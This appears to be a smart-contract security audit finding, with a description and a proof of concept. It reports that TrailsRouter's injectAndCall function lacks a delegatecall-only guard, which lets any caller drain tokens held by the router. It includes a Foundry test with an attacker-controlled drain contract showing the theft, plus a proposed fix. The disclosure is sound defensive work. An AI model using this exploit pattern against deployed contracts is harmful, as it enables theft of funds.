  "body": "## Finding description and impact\n\nThe TrailsRouter.injectAndCall function is designed to run only in a delegatecall context (inside a Sequence wallet), where address(this) resolves to the wallet and _getSelfBalance(token) refers to the wallet’s balance.\n\nBecause injectAndCall is public and not protected by onlyDelegatecall, anyone can call it directly on the router contract. In that direct-call context, _getSelfBalance(token) returns the router’s own ERC20/ETH balance, and _injectAndExecuteCall uses that balance to approve and call an attacker-controlled target.\n\nIf any tokens or ETH ever sit on the router contract, a malicious user can drain all router-held funds via a single injectAndCall call.\n\nThe router assumes that any call to injectAndCall is executed via delegatecall from a wallet. Under that assumption:\n\naddress(this) is the wallet.\n\n_getSelfBalance(token) returns the wallet’s funds.\n\nUsing that balance in a downstream call spends the caller’s own funds.\n\nIn reality, the function is:\n\n```javascript\n\nfunction injectAndCall(\n    address token,\n    address target,\n    bytes calldata callData,\n    uint256 amountOffset,\n    bytes32 placeholder\n) public payable {\n    uint256 callerBalance = _getSelfBalance(token);\n    if (callerBalance == 0) {\n        if (token == address(0)) {\n            revert NoEthAvailable();\n        } else {\n            revert NoTokensToSweep();\n        }\n    }\n\n    _injectAndExecuteCall(token, target, callData, amountOffset, placeholder, callerBalance);\n}\n\n\n```\n\nand has no onlyDelegatecall modifier. So there are two execution modes:\n\nIntended mode (safe-ish): delegatecalled from a wallet\n\naddress(this) == wallet\n\n_getSelfBalance = wallet balance\n\nActual vulnerable mode: called directly on the router\n\naddress(this) == router\n\n_getSelfBalance = router contract’s own balance\n\nImpact\n\nIn the vulnerable (direct-call) mode, any ERC20 tokens or ETH that end up held by the TrailsRouter contract itself can be spent by any arbitrary external caller.\n\nA malicious user only needs:\n\nThe router to hold a balance (any non-zero ERC20 or ETH).\n\nA target contract of their choosing (e.g., something that calls transferFrom(msg.sender, ...)).\n\nOne direct call to injectAndCall.\n\n\n## Recommended mitigation steps\n\nEnforce delegatecall-only usage (onlyDelegatecall)\n\nThe primary fix is to match other sensitive router methods (sweep, refundAndSweep, etc.) and guard the entry point:\n```javascript\n\nfunction injectAndCall(\n    address token,\n    address target,\n    bytes calldata callData,\n    uint256 amountOffset,\n    bytes32 placeholder\n) public payable onlyDelegatecall {\n    uint256 callerBalance = _getSelfBalance(token);\n    if (callerBalance == 0) {\n        if (token == address(0)) {\n            revert NoEthAvailable();\n        } else {\n            revert NoTokensToSweep();\n        }\n    }\n\n    _injectAndExecuteCall(\n        token,\n        target,\n        callData,\n        amountOffset,\n        placeholder,\n        callerBalance\n    );\n}\n\n```",
  "proof_of_concept": "forge test --match-test test_PoC_injectAndCall_canDrainRouterBalance -vvvv\n\n```javascript\n\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {TrailsRouter} from \"src/TrailsRouter.sol\";\nimport {MockERC20} from \"test/mocks/MockERC20.sol\";\n\n/// @notice Simple target that pulls tokens from msg.sender\ncontract DrainTarget {\n    MockERC20 public token;\n    uint256 public lastAmount;\n\n    constructor(address _token) {\n        token = MockERC20(_token);\n    }\n\n    function deposit(uint256 amount, address /*receiver*/ ) external {\n        lastAmount = amount;\n        require(token.transferFrom(msg.sender, address(this), amount), \"transferFrom failed\");\n    }\n}\n\n/// @notice PoC for CRITICAL-3: `injectAndCall` callable directly, spending router-held funds\ncontract TrailsRouterInjectAndCallPoC is Test {\n    TrailsRouter internal router;\n    MockERC20 internal token;\n    DrainTarget internal drainTarget;\n\n    address internal attacker;\n\n    bytes32 internal constant PLACEHOLDER =\n        0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef;\n\n    function setUp() public {\n        router = new TrailsRouter();\n        token = new MockERC20(\"Test Token\", \"TST\", 18);\n        drainTarget = new DrainTarget(address(token));\n        attacker = makeAddr(\"attacker\");\n\n        // Give the router contract a balance it \"shouldn't\" be able to lose via a direct call\n        uint256 routerBalance = 1_000e18;\n        token.mint(address(router), routerBalance);\n    }\n\n    /// @notice PoC: attacker directly calls injectAndCall and drains all router-held tokens into drainTarget\n    function test_PoC_injectAndCall_canDrainRouterBalance() public {\n        uint256 initialRouterBalance = token.balanceOf(address(router));\n        uint256 initialAttackerBalance = token.balanceOf(attacker);\n        uint256 initialTargetBalance = token.balanceOf(address(drainTarget));\n\n        assertGt(initialRouterBalance, 0, \"router should start funded\");\n        assertEq(initialAttackerBalance, 0, \"attacker starts with zero tokens\");\n        assertEq(initialTargetBalance, 0, \"target starts with zero tokens\");\n\n        // Attacker crafts calldata that asks the target to pull `amount` from msg.sender (the router)\n        bytes memory callData =\n            abi.encodeWithSignature(\"deposit(uint256,address)\", PLACEHOLDER, attacker);\n\n        // Direct call to the router (NOT via delegatecall / wallet context)\n        vm.prank(attacker);\n        router.injectAndCall(address(token), address(drainTarget), callData, 4, PLACEHOLDER);\n\n        // Impact: router's token balance is drained into the target, despite attacker never owning tokens\n        uint256 finalRouterBalance = token.balanceOf(address(router));\n        uint256 finalTargetBalance = token.balanceOf(address(drainTarget));\n        uint256 finalAttackerBalance = token.balanceOf(attacker);\n\n        assertEq(finalRouterBalance, 0, \"router balance should be fully drained\");\n        assertEq(finalTargetBalance, initialRouterBalance, \"target received all router-held tokens\");\n        assertEq(finalAttackerBalance, 0, \"attacker never directly held tokens but controls target\");\n    }\n}\n\n\n\n```",
